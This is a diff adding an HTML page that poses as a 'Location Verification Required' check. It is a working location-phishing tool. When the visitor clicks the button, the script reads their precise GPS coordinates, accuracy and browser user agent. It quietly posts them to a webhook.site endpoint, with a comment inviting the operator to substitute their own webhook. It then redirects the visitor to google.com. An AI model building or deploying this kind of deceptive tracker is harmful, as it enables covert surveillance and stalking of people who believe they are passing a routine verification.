@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Verification Required</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #333;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        .header h1 { font-size: 28px; margin-bottom: 10px; color: #2c3e50; }
+        .header p { color: #7f8c8d; font-size: 16px; margin-bottom: 30px; }
+        .btn-primary {
+            background: linear-gradient(45deg, #3498db, #2980b9);
+            color: white; border: none;
+            padding: 15px 30px; font-size: 18px; font-weight: 600;
+            border-radius: 50px; cursor: pointer; transition: all 0.3s;
+            width: 100%; box-shadow: 0 10px 20px rgba(52,152,219,0.3);
+        }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(52,152,219,0.4); }
+        .btn-primary:active { transform: translateY(0); }
+        .status { min-height: 80px; display: flex; align-items: center; justify-content: center; }
+        .hidden { display: none !important; }
+        #loading { color: #27ae60; }
+        .spinner {
+            border: 3px solid #f3f3f3; border-top: 3px solid #27ae60;
+            border-radius: 50%; width: 40px; height: 40px;
+            animation: spin 1s linear infinite; margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #success { color: #27ae60; }
+        #success h2 { margin-bottom: 10px; }
+        .btn-secondary {
+            background: #95a5a6; color: white;
+            padding: 12px 24px; border-radius: 25px;
+            text-decoration: none; display: inline-block;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📍 Location Access Required</h1>
+            <p>Please enable location services to continue</p>
+        </div>
+        
+        <div class="status" id="status">
+            <button id="enableLocation" class="btn-primary">Enable Location</button>
+        </div>
+        
+        <div id="loading" class="hidden">
+            <div class="spinner"></div>
+            <p>Getting your precise location...</p>
+        </div>
+        
+        <div id="success" class="hidden">
+            <h2>✅ Location Verified!</h2>
+            <p>Thank you for enabling location services.</p>
+            <a href="#" class="btn-secondary" onclick="redirect()">Continue</a>
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const enableBtn = document.getElementById('enableLocation');
+            const status = document.getElementById('status');
+            const loading = document.getElementById('loading');
+            const success = document.getElementById('success');
+            
+            enableBtn.addEventListener('click', getLocation);
+            
+            async function getLocation() {
+                status.classList.add('hidden');
+                loading.classList.remove('hidden');
+                
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+                    
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    
+                    const data = {
+                        lat, lon, accuracy,
+                        google_maps: `https://www.google.com/maps?q=${lat},${lon}`,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    // SEND LOCATION TO YOUR WEBHOOK (UPDATE THIS URL)
+                    await fetch(https://webhook.site/78c2e665-ac3b-4570-9840-84d314f91ca1, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify(data)
+                    }).catch(() => {});
+                    
+                    // SHOW COORDINATES ON PAGE (FOR TESTING)
+                    document.getElementById('success').innerHTML = `
+                        <h2>✅ Location Verified!</h2>
+                        <p><strong>Lat:</strong> ${lat.toFixed(6)}</p>
+                        <p><strong>Lon:</strong> ${lon.toFixed(6)}</p>
+                        <p><strong>Accuracy:</strong> ${accuracy.toFixed(0)}m</p>
+                        <p><a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">🗺️ View on Google Maps</a></p>
+                        <a href="#" class="btn-secondary" onclick="redirect()">Continue</a>
+                    `;
+                    
+                    loading.classList.add('hidden');
+                    success.classList.remove('hidden');
+                    
+                } catch (error) {
+                    loading.classList.add('hidden');
+                    status.classList.remove('hidden');
+                    enableBtn.textContent = 'Enable Location (Try Again)';
+                }
+            }
+        });
+        
+        function redirect() {
+            window.location.href = 'https://google.com';
+        }
+    </script>
+</body>
+</html>
